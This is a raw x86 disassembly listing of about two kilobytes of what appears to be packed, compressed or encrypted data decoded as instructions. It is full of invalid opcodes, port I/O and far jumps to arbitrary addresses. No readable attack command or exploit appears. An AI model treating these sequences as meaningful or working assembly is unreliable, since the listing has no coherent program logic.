  423400:	xchg   DWORD PTR [eax+0x44],ebx
  423403:	outs   dx,DWORD PTR ds:[esi]
  423404:	inc    eax
  423405:	or     al,0xdc
  423407:	dec    edi
  423408:	fisubr DWORD PTR [ebx]
  42340a:	shr    BYTE PTR [ebx+0xb5f1a7],0xca
  423411:	push   eax
  423412:	ins    DWORD PTR es:[edi],dx
  423413:	(bad)  
  423414:	mov    edi,0x15eee779
  423419:	sbb    al,0x4f
  42341b:	pop    es
  42341c:	dec    eax
  42341d:	inc    ecx
  42341e:	jnp    0x4233cc
  423420:	popf   
  423421:	icebp  
  423422:	loopne 0x4233c3
  423424:	pusha  
  423425:	pop    ebx
  423426:	xchg   DWORD PTR [edi+0x35],edi
  423429:	cmp    BYTE PTR [esi-0x2784ef14],cl
  42342f:	popf   
  423430:	mov    al,0x1a
  423432:	sbb    ebp,esi
  423434:	pusha  
  423435:	mov    ss,WORD PTR [edi-0x1a825956]
  42343b:	ins    DWORD PTR es:[edi],dx
  42343c:	cmp    BYTE PTR [ebx+0x7d5bf8c5],ah
  423442:	mov    ebx,0x19c61f8c
  423447:	fsubr  DWORD PTR [ebp-0x393afc1b]
  42344d:	stc    
  42344e:	adc    eax,0xb6e7793f
  423453:	cmp    al,0x56
  423455:	jl     0x42348a
  423457:	jns    0x4234cf
  423459:	xchg   edx,eax
  42345a:	inc    edi
  42345b:	jne    0x423449
  42345d:	mov    edi,0xf9c78e36
  423462:	in     al,0x2b
  423464:	push   0x1
  423466:	pop    edi
  423467:	cmp    eax,0xf7b0450d
  42346c:	fstp   DWORD PTR [eax+0x7518b863]
  423472:	or     al,0xa0
  423474:	jl     0x42344f
  423476:	lds    ebp,FWORD PTR [ebp-0x76c6a2d]
  42347c:	jl     0x423491
  42347e:	push   0x4d
  423480:	adc    eax,0xd27fb871
  423485:	lods   al,BYTE PTR ds:[esi]
  423486:	pop    esp
  423487:	add    ebp,0x2f
  42348a:	std    
  42348b:	out    dx,al
  42348c:	les    eax,FWORD PTR cs:[ebp-0x6b]
  423490:	lahf   
  423491:	test   al,ah
  423493:	js     0x42344d
  423495:	adc    esp,edi
  423497:	mov    ds:0xb9251b9c,eax
  42349c:	ficomp DWORD PTR [ebx-0x1c]
  42349f:	pop    ebx
  4234a0:	ja     0x4234a1
  4234a2:	cs pop ebp
  4234a4:	das    
  4234a5:	xchg   ebx,eax
  4234a6:	jne    0x423428
  4234a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234aa:	add    DWORD PTR [esi],eax
  4234ac:	mov    ds:0x80e0d6e2,eax
  4234b1:	mov    al,ds:0x184a0c00
  4234b6:	repnz mov ah,BYTE PTR [esi-0x70392b64]
  4234bd:	and    eax,0xaa742420
  4234c2:	lea    esi,[edi+0x5adcb76]
  4234c8:	add    ecx,DWORD PTR [esi+0x25]
  4234cb:	hlt    
  4234cc:	ins    BYTE PTR es:[edi],dx
  4234cd:	mov    esi,ds
  4234cf:	into   
  4234d0:	in     al,dx
  4234d1:	or     dh,BYTE PTR [edx]
  4234d3:	jb     0x4234fe
  4234d5:	mov    edx,0xb17db118
  4234da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234db:	(bad)  
  4234dc:	adc    eax,0x18c5a91c
  4234e1:	dec    esp
  4234e2:	dec    ebp
  4234e3:	jbe    0x423502
  4234e5:	in     eax,0xa8
  4234e7:	xor    BYTE PTR [edx-0x6b7ada9b],al
  4234ed:	ss call 0xd6a5:0xa842aeeb
  4234f5:	jne    0x423489
  4234f7:	(bad)  
  4234f8:	aad    0xad
  4234fa:	jno    0x423530
  4234fc:	in     eax,0xa
  4234fe:	ret    
  4234ff:	jno    0x4234b9
  423501:	or     esp,DWORD PTR [edi-0x45]
  423504:	inc    ebx
  423505:	shl    BYTE PTR [ebp-0xf146c93],cl
  42350b:	lock jl 0x423515
  42350e:	jne    0x4234c8
  423510:	jecxz  0x4234d8
  423512:	ss pop eax
  423514:	or     BYTE PTR [ebx+0x58],dh
  423517:	sahf   
  423518:	leave  
  423519:	mov    edi,0x785af1d2
  42351e:	retf   
  42351f:	inc    esi
  423520:	(bad)
  423524:	sbb    dl,BYTE PTR [edx+edi*4+0x28fcb123]
  42352b:	(bad)  
  42352c:	push   cs
  42352d:	mov    cl,0xd4
  42352f:	fimul  WORD PTR [edi-0x45]
  423532:	dec    ecx
  423533:	enter  0xcbdc,0x1a
  423537:	cmp    DWORD PTR [ecx+0x35],ebp
  42353a:	enter  0x9727,0x88
  42353e:	lods   al,BYTE PTR ds:[esi]
  42353f:	popf   
  423540:	popf   
  423541:	mov    dh,0xe6
  423543:	xor    ebp,esi
  423545:	add    ah,BYTE PTR [edi]
  423547:	or     ch,BYTE PTR [esi+0xa50175a]
  42354d:	call   0x2745:0xb6756ded
  423554:	test   eax,0xe950bca6
  423559:	pop    eax
  42355a:	push   edx
  42355b:	xor    DWORD PTR [ebp-0x7b],0x34
  42355f:	out    dx,eax
  423560:	pop    edi
  423561:	sar    ebp,cl
  423563:	xchg   esi,eax
  423564:	jnp    0x4234ea
  423566:	fbld   TBYTE PTR [esi-0x5c]
  423569:	out    0xac,al
  42356b:	sbb    al,0x7e
  42356d:	inc    esp
  42356e:	cld    
  42356f:	add    ah,bl
  423571:	cli    
  423572:	mov    DWORD PTR [ebx],esi
  423574:	int3   
  423575:	push   esp
  423576:	dec    ecx
  423577:	enter  0xb3dc,0x90
  42357b:	fwait
  42357c:	dec    edi
  42357d:	add    DWORD PTR [ecx],esi
  42357f:	xor    edx,ebx
  423581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423582:	jmp    0xc07b70d4
  423587:	xlat   BYTE PTR ds:[ebx]
  423588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423589:	in     eax,dx
  42358a:	inc    esp
  42358b:	mov    ds:0xf48f8043,eax
  423590:	sbb    bh,0x25
  423593:	adc    dh,ah
  423595:	jg     0x423556
  423597:	jp     0x423592
  423599:	sub    DWORD PTR [esi+0x231ac5a6],ebp
  42359f:	jl     0x423620
  4235a1:	popf   
  4235a2:	pop    ebp
  4235a3:	sub    ebx,esi
  4235a5:	cld    
  4235a6:	sub    eax,0x951b8e58
  4235ab:	in     eax,0x3
  4235ad:	lahf   
  4235ae:	ss inc eax
  4235b0:	xrelease xchg BYTE PTR [ecx-0x35],cl
  4235b4:	and    eax,0x692c5a41
  4235b9:	sbb    al,0x59
  4235bb:	aaa    
  4235bc:	adc    BYTE PTR [edx+0x0],bh
  4235bf:	or     BYTE PTR [edi-0x52],bl
  4235c2:	mov    WORD PTR [ebp+0x2f],fs
  4235c5:	int    0xd6
  4235c7:	add    eax,0xda58c2c1
  4235cc:	add    ebx,esi
  4235ce:	xor    DWORD PTR [eax+0x5c],eax
  4235d1:	repz mov ecx,0x12adb160
  4235d7:	inc    ecx
  4235d8:	(bad)  
  4235da:	lock mov edx,0xded86a65
  4235e0:	push   0xdbf5e71f
  4235e5:	or     al,0xa6
  4235e7:	loop   0x4235c7
  4235e9:	stos   BYTE PTR es:[edi],al
  4235ea:	push   ecx
  4235eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235ec:	cmc    
  4235ed:	inc    eax
  4235ee:	(bad)  
  4235ef:	cwde   
  4235f0:	dec    edi
  4235f1:	and    BYTE PTR [edx],cl
  4235f3:	pusha  
  4235f4:	jp     0x423666
  4235f6:	xor    DWORD PTR [edx-0x70],eax
  4235f9:	stos   DWORD PTR es:[edi],eax
  4235fa:	out    0x71,al
  4235fc:	rcl    DWORD PTR [edx],0x6b
  4235ff:	imul   edx,esp,0x386a20a9
  423605:	dec    ebx
  423606:	mov    ch,0xe7
  423608:	(bad)  
  423609:	mov    edx,0x6af9e08
  42360e:	xchg   DWORD PTR [edx+0x28],esp
  423611:	imul   BYTE PTR [ecx-0x6]
  423614:	push   ecx
  423615:	push   ecx
  423616:	cmc    
  423617:	inc    edx
  423618:	cmp    DWORD PTR [ebx-0x7955cf65],edi
  42361e:	sub    DWORD PTR [ebp-0x28],esi
  423621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423622:	pop    ss
  423623:	inc    ebp
  423624:	imul   edx,DWORD PTR [ecx-0x29],0xa5db46fe
  42362b:	push   DWORD PTR [edi-0x7a14e673]
  423631:	pop    ebp
  423632:	or     BYTE PTR [ebx-0x21],bl
  423635:	call   0xded2:0x4cb9a6c7
  42363c:	ret    
  42363d:	cmp    DWORD PTR [eax-0x53],ebp
  423640:	dec    esp
  423641:	and    eax,0xd40bc15d
  423646:	int3   
  423647:	repnz fwait
  423649:	or     bh,ch
  42364b:	jns    0x42362b
  42364d:	sbb    eax,0xcbe3ef5
  423652:	das    
  423653:	mov    esi,0x7a1d8745
  423658:	ret    0x4f09
  42365b:	out    0xc8,eax
  42365d:	mov    bl,0x4a
  42365f:	adc    edi,edx
  423661:	xor    al,0xfa
  423663:	mov    ds:0xa00df129,eax
  423668:	repz sub ecx,DWORD PTR [ecx-0x60416443]
  42366f:	outs   dx,DWORD PTR ds:[esi]
  423670:	int3   
  423671:	mov    esp,0x9522f83
  423676:	push   eax
  423677:	add    BYTE PTR [eax+0x1a018bf9],0x8d
  42367e:	jmp    0x423631
  423680:	inc    edx
  423681:	jg     0x423681
  423683:	mov    ds:0xaf6c70cb,al
  423688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423689:	jle    0x42364f
  42368b:	pop    edi
  42368c:	fiadd  WORD PTR ss:[esi]
  42368f:	das    
  423690:	in     al,0xbd
  423692:	(bad)  
  423693:	mov    ds:0x9dc3dd0d,eax
  423698:	mov    bl,0x73
  42369a:	ficomp DWORD PTR ss:[eax-0x42]
  42369e:	jne    0x42369c
  4236a0:	in     al,dx
  4236a1:	or     ch,BYTE PTR [bx+di]
  4236a4:	shl    DWORD PTR [edi],0xdb
  4236a7:	pop    ecx
  4236a8:	jp     0x42368e
  4236aa:	nop
  4236ab:	ficom  WORD PTR [esi]
  4236ad:	or     edx,edx
  4236af:	loope  0x423688
  4236b1:	loope  0x4236a7
  4236b3:	repz mov esp,0x1aff5a88
  4236b9:	scas   al,BYTE PTR es:[edi]
  4236ba:	or     al,0x9
  4236bc:	sbb    al,0x6c
  4236bf:	sub    eax,0xbd951e0d
  4236c4:	mov    eax,0x5d40c95d
  4236c9:	mov    edi,0xdbbe4022
  4236ce:	ins    DWORD PTR es:[edi],dx
  4236cf:	jmp    0xfa6d414b
  4236d4:	call   0xb4b8:0xfa9d0125
  4236db:	pop    ebp
  4236dc:	aas    
  4236dd:	mov    esi,0x6900a46f
  4236e2:	jo     0x4236e2
  4236e4:	mov    ds:0x74c37681,al
  4236e9:	push   ds
  4236ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236eb:	leave  
  4236ec:	popa   
  4236ed:	outs   dx,DWORD PTR ds:[esi]
  4236ee:	inc    edi
  4236ef:	dec    ebx
  4236f0:	xchg   edx,eax
  4236f1:	xchg   ebp,eax
  4236f3:	nop
  4236f4:	jmp    0x30be:0xc93b4868
  4236fb:	fistp  WORD PTR [ebx+0x3ed47d08]
  423701:	je     0x423694
  423703:	(bad)  
  423704:	in     eax,dx
  423705:	mov    BYTE PTR [eax],ah
  423707:	ror    eax,cl
  423709:	ror    DWORD PTR [ecx-0x53],1
  42370c:	shr    DWORD PTR [ebx],1
  42370e:	sbb    ch,BYTE PTR gs:[ecx-0x47f9b901]
  423715:	xchg   BYTE PTR [eax+esi*4-0x44],dh
  423719:	das    
  42371a:	and    BYTE PTR [edi-0x5cf16131],cl
  423720:	in     eax,dx
  423721:	or     bh,BYTE PTR cs:[ecx]
  423724:	xchg   BYTE PTR [esi-0x47e44007],dl
  42372a:	mov    BYTE PTR [esi],dh
  42372c:	call   0x3198d1e5
  423731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423732:	mov    ds:0x8aeee623,eax
  423737:	in     eax,dx
  423738:	ins    DWORD PTR es:[edi],dx
  423739:	xchg   esi,eax
  42373a:	sti    
  42373b:	xor    eax,0x9091106
  423740:	std    
  423741:	mov    ebp,DWORD PTR [eax]
  423743:	rol    edx,1
  423745:	jl     0x423712
  423747:	inc    edi
  423748:	xlat   BYTE PTR ds:[ebx]
  423749:	outs   dx,BYTE PTR gs:[esi]
  42374b:	int3   
  42374c:	dec    ebp
  42374d:	imul   ecx,DWORD PTR [ebx],0xffffff8d
  423750:	adc    DWORD PTR [esi],esp
  423752:	mul    BYTE PTR [ecx-0x60e4485]
  423758:	sti    
  423759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42375a:	xor    BYTE PTR [edx+0x58],dh
  42375d:	push   esi
  42375e:	mov    DWORD PTR [ebx+esi*4+0x31],ecx
  423762:	jne    0x42372b
  423764:	dec    ecx
  423765:	in     eax,dx
  423766:	fdivr  QWORD PTR ds:0xc3d154d0
  42376c:	push   ebx
  42376d:	leave  
  42376e:	push   ss
  42376f:	jp     0x423702
  423771:	imul   edx,edi,0x6c
  423774:	out    dx,eax
  423775:	dec    ebp
  423776:	jecxz  0x423743
  423778:	pop    ebp
  423779:	pop    ds
  42377a:	imul   esi,DWORD PTR [edx+esi*1+0x6e],0x6f80e078
  423782:	call   0xeb13:0xdf217d3
  423789:	or     DWORD PTR [edx-0x5124e196],0x9dd99da9
  423793:	jmp    0xda860af9
  423798:	xor    al,0xda
  42379a:	je     0x4237b2
  42379c:	mov    WORD PTR [ebp+0x254bae9f],ds
  4237a2:	outs   dx,BYTE PTR ds:[esi]
  4237a3:	jae    0x423786
  4237a5:	imul   edi,DWORD PTR [ebp+0x1872455b],0xe8441ac9
  4237af:	ror    DWORD PTR [ecx+0x3d],cl
  4237b2:	cmp    eax,ecx
  4237b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237b5:	pusha  
  4237b6:	aam    0x40
  4237b8:	lods   al,BYTE PTR ds:[esi]
  4237b9:	scas   al,BYTE PTR es:[edi]
  4237ba:	ins    DWORD PTR es:[edi],dx
  4237bb:	push   es
  4237bc:	lds    eax,FWORD PTR [esp+edi*1+0x5fb25fd9]
  4237c3:	jge    0x4237de
  4237c5:	test   BYTE PTR [edx-0x7],dh
  4237c8:	and    al,0xd0
  4237ca:	addr16 jne 0x423750
  4237cd:	mov    gs,WORD PTR [eax]
  4237cf:	fwait
  4237d0:	jge    0x4237b1
  4237d2:	xor    edx,DWORD PTR [ebx-0x30]
  4237d5:	in     eax,dx
  4237d6:	rcl    al,1
  4237d8:	dec    eax
  4237d9:	adc    ebx,ebp
  4237db:	sbb    al,0xb3
  4237dd:	sahf   
  4237de:	xchg   ebx,eax
  4237df:	mov    ebp,0x76228c6d
  4237e4:	das    
  4237e5:	jae    0x423830
  4237e7:	push   ebp
  4237e8:	jp     0x42382a
  4237ea:	mov    bl,0xc2
  4237ec:	fisttp QWORD PTR [eax+0x7717c623]
  4237f2:	sti    
  4237f3:	pop    esi
  4237f4:	sub    eax,0x58de57f6
  4237f9:	mov    dh,0x61
  4237fb:	inc    eax
  4237fc:	or     ebx,edx
  4237fe:	pop    edi
  4237ff:	mov    ecx,0xae024e64
  423804:	pop    ebx
  423805:	ss (bad) 
  423807:	dec    ebp
  423808:	push   es
  423809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42380a:	add    al,0xb9
  42380c:	push   0x13ef6c60
  423811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423812:	out    0x8d,al
  423814:	xchg   edx,eax
  423815:	inc    edi
  423816:	std    
  423817:	(bad)  
  423819:	iret   
  42381a:	bound  edx,QWORD PTR [edx]
  42381c:	cmp    ecx,DWORD PTR [edx-0x6c2a6024]
  423822:	out    0xc4,al
  423824:	div    BYTE PTR [eax-0x40]
  423827:	and    BYTE PTR [ebx+0xfeee735],0x90
  42382e:	fsub   st(3),st
  423830:	sub    al,0xa4
  423832:	inc    esi
  423833:	(bad)  
  423834:	push   ecx
  423835:	leave  
  423836:	xor    BYTE PTR [edx+edi*8],ah
  423839:	push   esi
  42383a:	xor    al,0x3e
  42383c:	popf   
  42383d:	mov    ch,0x31
  42383f:	(bad)  
  423841:	jl     0x423881
  423843:	bnd jno 0x42384d
  423846:	(bad)  
  423847:	das    
  423848:	mov    eax,0xb011ee70
  42384d:	outs   dx,DWORD PTR ds:[esi]
  42384e:	call   0xab38:0xa9c8f6a
  423855:	jb     0x423864
  423857:	mov    esi,0x3a8d6dae
  42385c:	scas   al,BYTE PTR es:[edi]
  42385d:	fdiv   QWORD PTR [edi]
  42385f:	sbb    edx,ebp
  423861:	adc    al,0xf8
  423863:	mov    esi,0x7ccce776
  423868:	stos   DWORD PTR es:[edi],eax
  423869:	gs adc al,0x3a
  42386c:	arpl   WORD PTR [edx+0x48],bp
  42386f:	cmp    bl,ch
  423871:	test   DWORD PTR [ecx+0x2da208a8],esp
  423877:	ror    DWORD PTR [ecx-0x5a7f6a0c],0x9f
  42387e:	mov    bh,0x54
  423880:	xor    al,0xa2
  423882:	pop    ss
  423883:	adc    bh,BYTE PTR ds:0x4ec84c7a
  423889:	dec    eax
  42388a:	push   0xf3b139d
  42388f:	cmp    DWORD PTR [ebp-0x63],ebx
  423892:	sbb    ah,BYTE PTR [ecx-0x25]
  423895:	(bad)  
  423896:	jbe    0x423844
  423898:	adc    al,0x96
  42389a:	or     al,0xc4
  42389c:	pushf  
  42389d:	mov    cl,dh
  42389f:	and    edx,edx
  4238a1:	(bad)  
  4238a2:	mov    al,ds:0x4da9c5ac
  4238a7:	(bad)  
  4238a8:	push   edx
  4238a9:	lds    ebp,FWORD PTR [eax]
  4238ab:	dec    DWORD PTR [edx+ebx*2-0x22]
  4238af:	cwde   
  4238b0:	ja     0x42383d
  4238b2:	int    0xd7
  4238b4:	mov    bh,0xc
  4238b6:	dec    ebx
  4238b7:	inc    esp
  4238b8:	push   0x61d671e5
  4238bd:	stos   DWORD PTR es:[edi],eax
  4238be:	mov    ah,0xfe
  4238c0:	test   al,0xfc
  4238c2:	ret    0x759
  4238c5:	imul   ecx,DWORD PTR [ebp+0x2c455f40],0xffffffaa
  4238cc:	nop
  4238cd:	adc    esp,ecx
  4238cf:	inc    edx
  4238d0:	adc    eax,0x6c6e01ee
  4238d5:	aas    
  4238d6:	dec    esi
  4238d7:	test   DWORD PTR [eax+ecx*1],edx
  4238da:	int3   
  4238db:	jmp    0x4238bf
  4238dd:	and    al,0x31
  4238df:	sub    bh,BYTE PTR [eax-0x47]
  4238e2:	cld    
  4238e3:	jns    0x4238ad
  4238e5:	addr16 jge 0x423883
  4238e8:	fwait
  4238e9:	inc    edi
  4238ea:	or     BYTE PTR [ecx-0x7f],bh
  4238ed:	mov    ss,WORD PTR [ecx]
  4238ef:	shl    DWORD PTR [esi-0x52],cl
  4238f2:	pop    ebx
  4238f3:	(bad)  
  4238f4:	out    0xe5,al
  4238f6:	fwait
  4238f7:	in     eax,dx
  4238f8:	jae    0x42390a
  4238fa:	inc    DWORD PTR [edx]
  4238fc:	lock in eax,dx
  4238fe:	(bad)  
  4238ff:	addr16 dec eax
  423901:	lock cdq 
  423903:	call   0x7a25fb5c
  423908:	fadd   st,st(6)
  42390a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42390b:	lock cmp edi,DWORD PTR [ecx+ebp*2-0x15]
  423910:	test   DWORD PTR [edx+0xa8733be],0xd570048c
  42391a:	jg     0x42391e
  42391c:	pop    ecx
  42391d:	or     DWORD PTR ds:0x2eb13094,ecx
  423923:	inc    ecx
  423924:	idiv   DWORD PTR [edx+eiz*8-0xb38567a]
  42392b:	jno    0x42395e
  42392d:	scas   al,BYTE PTR es:[di]
  42392f:	sbb    cl,bh
  423931:	ss int 0x19
  423934:	sar    esi,1
  423936:	pop    es
  423937:	mov    ds:0x864e9a3c,al
  42393c:	sbb    bh,BYTE PTR [ecx]
  42393e:	leave  
  42393f:	lods   eax,DWORD PTR ds:[esi]
  423940:	nop
  423941:	popf   
  423942:	outs   dx,BYTE PTR ds:[esi]
  423943:	mov    BYTE PTR [eax-0x5c],al
  423946:	xchg   ecx,eax
  423947:	and    BYTE PTR [ecx-0x4852270e],bh
  42394d:	in     al,dx
  42394e:	pop    es
  42394f:	adc    DWORD PTR [eax+0x4cab47e5],edi
  423955:	dec    edx
  423956:	repnz shl BYTE PTR ds:0xbc00e14a,1
  42395d:	xchg   ecx,eax
  42395e:	jne    0x4239d9
  423960:	mov    al,ds:0xaf2abe93
  423965:	mov    BYTE PTR [edx+0x51],dl
  423968:	dec    eax
  423969:	mov    DWORD PTR [ebp-0x1a88db83],ebx
  42396f:	adc    edi,DWORD PTR [ecx]
  423971:	pop    ebx
  423972:	add    esi,DWORD PTR [edx-0x6f5fe3e4]
  423978:	test   eax,0xd600094e
  42397d:	ds mov al,0x5b
  423980:	inc    esp
  423981:	fbld   TBYTE PTR ds:0x3f28f03a
  423987:	cmc    
  423988:	sub    ebp,edx
  42398a:	xor    BYTE PTR [edx-0x5],0xe5
  42398e:	inc    ebx
  42398f:	jno    0x4239b5
  423991:	cld    
  423992:	gs mov bl,0xd
  423995:	(bad)  
  423996:	pushf  
  423997:	sbb    al,dh
  423999:	call   0xaa48579f
  42399e:	ret    
  42399f:	repnz sbb BYTE PTR [ebp+0x44c84692],bl
  4239a6:	les    edx,FWORD PTR [esi]
  4239a8:	xor    eax,0xa46e3e5d
  4239ae:	das    
  4239af:	rol    DWORD PTR [edi+0x176a7ae8],cl
  4239b5:	aaa    
  4239b6:	cli    
  4239b7:	daa    
  4239b8:	aad    0xe2
  4239ba:	push   ss
  4239bb:	fimul  WORD PTR [ebx-0xb]
  4239be:	jbe    0x4239ac
  4239c0:	inc    edx
  4239c1:	mov    ebp,0xc2d51f69
  4239c6:	pop    esi
  4239c7:	les    esi,FWORD PTR [eax]
  4239c9:	retf   
  4239ca:	inc    eax
  4239cb:	mov    eax,0xb3cc1e9a
  4239d0:	cwde   
  4239d1:	sti    
  4239d2:	mov    eax,ds:0xd9afb8a5
  4239d7:	mov    cl,0xb9
  4239d9:	xor    dl,BYTE PTR [di+0x2]
  4239dd:	clc    
  4239de:	cmp    dl,BYTE PTR [ebx*1-0x3ed6eda7]
  4239e5:	int    0x38
  4239e7:	dec    ebx
  4239e8:	mov    al,ds:0x311087e7
  4239ed:	icebp  
  4239ee:	xor    al,0xbd
  4239f0:	out    dx,eax
  4239f1:	jo     0x423a2f
  4239f3:	xor    ebx,eax
  4239f5:	xchg   ecx,eax
  4239f6:	jmp    0xdcfc:0x9d7be3fe
  4239fd:	shl    BYTE PTR [edx-0x33],0x4e
  423a01:	stos   BYTE PTR es:[edi],al
  423a02:	(bad)  
  423a03:	adc    BYTE PTR [ebx],dl
  423a05:	dec    esi
  423a06:	gs sub edx,esi
  423a09:	(bad)  
  423a0a:	test   DWORD PTR ds:0xcb8cb7f5,0xa014edc
  423a14:	xchg   al,ch
  423a16:	test   al,0x40
  423a18:	shr    DWORD PTR [ebx+0x4b],0xd2
  423a1c:	mul    BYTE PTR [ecx+0x35dcacf4]
  423a22:	shr    BYTE PTR [esi+0x5e18e297],cl
  423a28:	jnp    0x423a22
  423a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a2b:	push   edx
  423a2c:	pop    es
  423a2d:	sbb    eax,0x303f05d6
  423a32:	jno    0x423a3a
  423a34:	pop    es
  423a35:	pusha  
  423a36:	rcl    DWORD PTR [edi+0x42],cl
  423a39:	and    BYTE PTR ds:0x3c10ec6a,ch
  423a3f:	push   esp
  423a40:	lahf   
  423a41:	jecxz  0x423a22
  423a43:	and    eax,0x2e505a59
  423a48:	das    
  423a49:	jnp    0x423a54
  423a4b:	scas   eax,DWORD PTR es:[edi]
  423a4c:	imul   DWORD PTR [ebp+ebx*4+0x13]
  423a50:	cmp    BYTE PTR [edi-0x6f],bl
  423a53:	mov    ds,WORD PTR [edi+0x374d46af]
  423a59:	je     0x423ab3
  423a5b:	sub    eax,0x64fba8ad
  423a60:	and    eax,0x8351d933
  423a65:	(bad)  [edx]
  423a67:	fstp   DWORD PTR [edx]
  423a69:	into   
  423a6a:	sub    ebp,DWORD PTR [ebp+ebx*1-0x6f]
  423a6e:	not    DWORD PTR [eax]
  423a70:	cmp    bh,dh
  423a72:	adc    DWORD PTR [esi+edx*1-0x62d11d7b],ecx
  423a79:	adc    edx,DWORD PTR [ecx+ecx*8]
  423a7c:	xchg   ecx,eax
  423a7d:	cli    
  423a7e:	inc    edi
  423a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a80:	xor    DWORD PTR [esi+eax*2+0x2387af87],edx
  423a87:	test   DWORD PTR [esp+esi*4-0x1a5b8440],esp
  423a8e:	sub    al,0x27
  423a90:	bound  ebx,QWORD PTR [eax]
  423a92:	jp     0x423a87
  423a94:	xor    BYTE PTR [ebx],dl
  423a96:	stos   DWORD PTR es:[edi],eax
  423a97:	(bad)  
  423a98:	inc    eax
  423a99:	push   ss
  423a9a:	shr    DWORD PTR [edx-0x4b3d4285],0xa6
  423aa1:	(bad)  
  423aa2:	in     al,dx
  423aa3:	lea    esp,[esi]
  423aa5:	add    al,0xee
  423aa7:	aam    0x79
  423aa9:	cmp    esp,eax
  423aab:	dec    edi
  423aac:	or     DWORD PTR [esi],ebx
  423aae:	xchg   ch,al
  423ab0:	test   DWORD PTR [eax-0x6e46962b],ebx
  423ab6:	iret   
  423ab7:	cwde   
  423ab8:	sbb    eax,DWORD PTR [ebx]
  423aba:	mov    edi,0x58d3eb71
  423abf:	mov    ch,0xff
  423ac1:	retf   
  423ac2:	mov    dl,0xde
  423ac4:	lea    esp,[ecx+0x3438bdea]
  423aca:	or     al,0xdd
  423acc:	and    dl,BYTE PTR [ebx-0x33]
  423acf:	mov    cl,0x1b
  423ad1:	xchg   edx,eax
  423ad2:	push   ss
  423ad3:	dec    edx
  423ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ad5:	sbb    ecx,DWORD PTR [ebp+0x2ded7ab8]
  423adb:	push   esi
  423adc:	stc    
  423add:	in     eax,0xdd
  423adf:	pop    edi
  423ae0:	adc    al,0x86
  423ae2:	mov    al,0x91
  423ae4:	jecxz  0x423b40
  423ae6:	mov    bl,0x2d
  423ae8:	sbb    ah,BYTE PTR [ecx]
  423aea:	push   ebp
  423aeb:	xchg   DWORD PTR [eax-0x52c9d3b6],ecx
  423af1:	mov    DWORD PTR [ebp+0x4c683e7b],edx
  423af7:	cs mov ch,0xda
  423afa:	and    DWORD PTR [eax],esp
  423afc:	sti    
  423afd:	push   ss
  423afe:	cwde   
  423aff:	lods   al,BYTE PTR ds:[esi]
  423b00:	lods   al,BYTE PTR ds:[esi]
  423b01:	(bad)
  423b05:	adc    BYTE PTR [ecx],0x68
  423b08:	lods   al,BYTE PTR ds:[esi]
  423b09:	jnp    0x423b06
  423b0b:	loop   0x423b0f
  423b0d:	and    ch,dh
  423b0f:	and    esi,edx
  423b11:	sub    dl,BYTE PTR [edx+ebx*2-0x11]
  423b15:	jp     0x423b92
  423b17:	adc    DWORD PTR [eax+eax*4+0x1b],ebx
  423b1b:	mov    esp,0x27eca5bc
  423b20:	mov    ds:0x2bfd8e19,al
  423b25:	add    BYTE PTR [ecx-0x2e],al
  423b28:	xchg   esi,eax
  423b29:	xor    DWORD PTR [ecx],ebx
  423b2b:	sahf   
  423b2c:	push   cs
  423b2d:	push   edi
  423b2e:	jg     0x423adb
  423b30:	pop    ebp
  423b31:	sahf   
  423b32:	pop    es
  423b33:	lock scas al,BYTE PTR es:[edi]
  423b35:	or     eax,0x7b9a9e65
  423b3a:	out    dx,al
  423b3b:	shl    BYTE PTR [ebx-0x432d9334],1
  423b41:	dec    esp
  423b42:	cdq    
  423b43:	scas   al,BYTE PTR es:[edi]
  423b44:	sub    ebx,DWORD PTR [ebx+0x5e16b5e3]
  423b4a:	adc    al,0xaa
  423b4c:	rcr    BYTE PTR [ebp-0x5b],cl
  423b4f:	popa   
  423b50:	jns    0x423b38
  423b52:	test   al,0x55
  423b54:	test   DWORD PTR [ecx+0x4e],ebp
  423b57:	in     al,0x97
  423b59:	mov    WORD PTR [edi],ss
  423b5b:	loop   0x423b69
  423b5d:	sbb    DWORD PTR [eax-0x3e565252],esp
  423b63:	push   0x41
  423b65:	push   edx
  423b66:	or     BYTE PTR [ecx+ebx*2-0x35b6cc1],dh
  423b6d:	popa   
  423b6e:	push   0xfffffff1
  423b70:	call   0x5434:0x79a9918a
  423b77:	pop    edi
  423b78:	es push cs
  423b7a:	mov    edi,0x715e8d6
  423b80:	(bad)  
  423b83:	fbstp  TBYTE PTR [ecx+ebx*4+0x11]
  423b87:	test   BYTE PTR [eax],dh
  423b89:	fxtract 
  423b8b:	sbb    BYTE PTR [edx+0x2b8d0066],ah
  423b91:	and    cl,BYTE PTR [edx-0x6a]
  423b94:	adc    esp,DWORD PTR [ecx-0x79]
  423b97:	(bad)
  423b9b:	and    bh,BYTE PTR [edi+0x122b5e75]
  423ba1:	mov    cl,BYTE PTR [edi]
  423ba3:	mov    BYTE PTR [edx],cl
  423ba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ba6:	outs   dx,BYTE PTR ds:[esi]
  423ba7:	ds xchg ebp,eax
  423ba9:	mov    edx,0xcdd6550e
  423bae:	mov    esi,0x80fd09e9
  423bb3:	inc    BYTE PTR [ebx-0xd3a8e4a]
  423bb9:	shr    BYTE PTR [edi],0x6f
  423bbc:	mov    ah,0x55
  423bbe:	shr    BYTE PTR [ebp-0x6df7da46],1
  423bc4:	dec    esp
  423bc5:	retf   0x4140
